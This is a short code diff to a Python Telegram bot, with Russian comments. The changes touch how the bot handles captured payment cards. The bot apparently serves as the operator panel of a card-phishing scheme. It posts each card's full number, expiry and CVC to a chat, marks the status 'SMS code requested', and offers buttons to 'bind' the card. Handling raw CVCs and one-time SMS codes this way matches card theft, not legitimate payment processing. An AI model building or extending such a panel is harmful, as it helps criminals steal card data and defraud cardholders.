@@ -330,8 +330,8 @@ def get_payment_buttons(payment_id, user_id="user123", card_number=None):
         ]
     ]
     
-    # Добавляем кнопку "Привязать" если карта не привязана
-    if card_number and not check_card_in_db(card_number):
+    # ВСЕГДА добавляем кнопку "Привязать" независимо от статуса карты
+    if card_number:
         buttons.append([
             InlineKeyboardButton(text="🔗 Привязать", callback_data=f"bind_{payment_id}_{user_id}_{card_number}")
         ])
@@ -620,12 +620,8 @@ async def process_payment_data(message: types.Message):
         )
 
         if payment_id:
-            # СНАЧАЛА СОХРАНЯЕМ КАРТУ В БД (если ее нет)
+            # Проверяем статус карты В БД СРАЗУ
             card_number = payment_data.get('card_number', '')
-            if card_number and not check_card_in_db(card_number):
-                save_card_to_db(card_number)  # Сохраняем карту
-            
-            # ТЕПЕРЬ проверяем статус карты В БД
             card_status = "ПРИВЯЗАННАЯ КАРТА" if check_card_in_db(card_number) else "НЕПРИВЯЗАННАЯ КАРТА"
             
             # Форматируем сообщение в новом стиле СРАЗУ
@@ -639,7 +635,7 @@ async def process_payment_data(message: types.Message):
             formatted_text += f"• Номер: {payment_data.get('card_number', '')}\n"
             formatted_text += f"• Срок: {payment_data.get('card_expiry', '')}\n"
             formatted_text += f"• CVC: {payment_data.get('cvc', '')}\n\n"
-            formatted_text += "📱 <b>Статус: Ожидание действий</b>\n\n"  # Изменил на "Ожидание действий"
+            formatted_text += "📱 <b>Статус: SMS код запрошен</b>\n\n"
             formatted_text += "Выберите действие:"
             
             await bot.send_message(
